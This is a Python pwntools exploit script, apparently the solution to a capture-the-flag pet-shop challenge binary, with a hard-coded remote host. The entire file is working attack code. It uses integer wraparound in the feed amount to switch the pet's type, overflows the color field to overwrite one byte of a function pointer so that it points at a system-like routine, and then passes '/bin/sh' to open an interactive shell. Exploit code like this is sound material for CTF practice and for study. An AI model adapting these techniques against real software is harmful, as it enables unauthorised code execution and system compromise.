#!/usr/bin/env python3
from pwn import *

# context.log_level = "debug"
context.binary = elf = ELF("./chall", checksec=False)

HOST = "35.247.131.2"
PORT = 1337

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(elf.path)

def menu_choice(p, choice):
    p.sendlineafter(b"Your choice", str(choice).encode())

def buy_cat(p, name=b"kitty", color=1):
    menu_choice(p, 1)                         # 1. Buy a pet
    p.sendlineafter(b"Choose animal", b"2")   # 2. Cat
    p.sendlineafter(b"Choose color", str(color).encode())
    p.sendlineafter(b"Enter pet name", name)

def feed(p, idx, amount):
    menu_choice(p, 2)                         # 2. Feed
    p.sendlineafter(b"Enter pet number", str(idx).encode())
    p.sendlineafter(b"How many cups", str(amount).encode())

def play_as_fish_train(p, idx, train=True, area=b"/bin/sh"):
    menu_choice(p, 5)                         # 5. Play
    p.sendlineafter(b"Enter pet number", str(idx).encode())
    if train:
        p.sendlineafter(b"Train your fish?", b"Y")
    else:
        p.sendlineafter(b"Train your fish?", b"N")
        p.sendlineafter(b"Enter area", area)

def play_as_dog_change_color(p, idx, payload):
    menu_choice(p, 5)                         # 5. Play
    p.sendlineafter(b"Enter pet number", str(idx).encode())
    p.sendlineafter(b"Change color?", b"Y")
    # send raw bytes (may include non-printable)
    p.sendlineafter(b"New color", payload)

def main():
    p = start()

    # 1. Buy a single cat as pet #1
    buy_cat(p, name=b"pet", color=1)

    # 2. Cat -> Fish (add 0x100)
    feed(p, 1, 256)          # W: 0x0200 -> 0x0300, type = 3

    # 3. Train fish: skill pointer = sub_159D (printf-like)
    play_as_fish_train(p, 1, train=True)

    # 4. Fish -> Dog (add 0xfe00 = 65024; (int16) = -512)
    feed(p, 1, 65024)        # W: 0x0300 -> 0x0100, type = 1 (dog)

    # 5. Dog: overflow color to flip sub_159D -> sub_1583
    # Only overwrite first byte of the function pointer at a1+24.
    # 7-byte payload: 6 padding bytes, then 0x83 to set low byte = 0x83.
    payload = b"A" * 6 + b"\x83"
    play_as_dog_change_color(p, 1, payload)

    # 6. Dog -> Fish (add 0x200 = 512)
    feed(p, 1, 512)          # W: 0x0100 -> 0x0300, type = 3

    # 7. Fish: use skill pointer (now system) with "/bin/sh"
    play_as_fish_train(p, 1, train=False, area=b"/bin/sh")

    p.interactive()

if __name__ == "__main__":
    main()

